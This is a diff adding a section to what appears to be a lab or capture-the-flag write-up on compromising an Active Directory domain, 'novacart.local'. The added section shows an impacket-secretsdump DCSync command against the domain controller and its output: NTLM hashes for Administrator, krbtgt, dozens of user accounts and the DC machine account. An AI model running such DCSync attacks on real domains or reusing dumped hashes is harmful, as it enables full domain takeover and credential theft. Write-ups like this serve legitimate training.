@@ -1512,6 +1512,44 @@ bloodyAD -u 'm.ibabao' -d 'novacart.local' --host DC.novacart.local --dc-ip 10.0
 Now i can do a DCSync
 
 ```python
+impacket-secretsdump -k -no-pass m.ibabao@dc.novacart.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fedc383b7f5166952ba5ded365b44dbe:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3d7b739f96dfd9853aa9bf6c42928dfa:::
+novacart.local\j.bronski:1104:aad3b435b51404eeaad3b435b51404ee:60c6cb0c429298d4cc1186575520a463:::
+novacart.local\d.barowski:1105:aad3b435b51404eeaad3b435b51404ee:a212c2e9d1edc7663313b1993f3d8740:::
+novacart.local\svc_jenkins:1106:aad3b435b51404eeaad3b435b51404ee:1cfdbfc59b003eb5952280a1e4699310:::
+novacart.local\j.paul:1111:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+novacart.local\m.ruehl:1112:aad3b435b51404eeaad3b435b51404ee:38780d5aa42d321bf018ec418e293a3e:::
+novacart.local\d.winkler:1113:aad3b435b51404eeaad3b435b51404ee:5104766957301768d276768287e3bb19:::
+novacart.local\j.dillon:1114:aad3b435b51404eeaad3b435b51404ee:bf208f038100f508527e834ffafbba20:::
+novacart.local\t.morris:1117:aad3b435b51404eeaad3b435b51404ee:6f2bda45e2ca130f430bbc9c71db8969:::
+novacart.local\l.harrow:1118:aad3b435b51404eeaad3b435b51404ee:d181f377216028fb733146251df442d2:::
+novacart.local\l.forta:1123:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novacart.local\p.bruce:1124:aad3b435b51404eeaad3b435b51404ee:5ef4d4fda1b780b7886d8ddde4754ed0:::
+novacart.local\m.mignola:1125:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novacart.local\l.thompson:1129:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novacart.local\m.brown:1133:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+novacart.local\m.ibabao:1135:aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a:::
+novacart.local\andrew.collins:1137:aad3b435b51404eeaad3b435b51404ee:eecc6b76550fdd636d871ff1deaaeda1:::
+DC=novacart,DC=local.DNSRoot\m.turner:1139:aad3b435b51404eeaad3b435b51404ee:96a38b7683349f5a9ad8cca6f1e345d0:::
+DC=novacart,DC=local.DNSRoot\d.parker:1140:aad3b435b51404eeaad3b435b51404ee:de6cdc3047ba82510c106f97eb51cf71:::
+DC=novacart,DC=local.DNSRoot\j.bennett:1141:aad3b435b51404eeaad3b435b51404ee:e4c77ae0ebd7da3e7247446fee5a990c:::
+DC=novacart,DC=local.DNSRoot\l.harrison:1142:aad3b435b51404eeaad3b435b51404ee:4c3db1c145f6d01bbf909f820ce56f2a:::
+DC=novacart,DC=local.DNSRoot\o.griffin:1143:aad3b435b51404eeaad3b435b51404ee:b30c22a05981fff32ac66d887c725086:::
+novacart.local\j.clark:1144:aad3b435b51404eeaad3b435b51404ee:c2d2ee194905126f680d10e30aba0a57:::
+novacart.local\m.hughes:1145:aad3b435b51404eeaad3b435b51404ee:c2d2ee194905126f680d10e30aba0a57:::
+novacart.local\d.james:1146:aad3b435b51404eeaad3b435b51404ee:dc76ef4fe9bbcde160a63154d106b3d2:::
+novacart.local\m.miller:1147:aad3b435b51404eeaad3b435b51404ee:dc76ef4fe9bbcde160a63154d106b3d2:::
+novacart.local\s.diaz:1148:aad3b435b51404eeaad3b435b51404ee:dc76ef4fe9bbcde160a63154d106b3d2:::
+novacart.local\cliff.b:1150:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:7a0200333a2b0eb462fb0b7517e86036:::
+
+...[SNIP]...
 ```
 
